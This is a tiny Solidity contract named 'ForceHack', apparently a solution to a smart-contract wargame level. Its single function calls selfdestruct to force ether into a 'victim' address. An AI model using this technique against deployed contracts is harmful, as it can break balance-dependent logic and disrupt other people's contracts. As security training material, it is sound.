pragma solidity ^0.6.0;

contract ForceHack {
    function pay(address payable victim) public payable {
        selfdestruct(victim);
    }
}
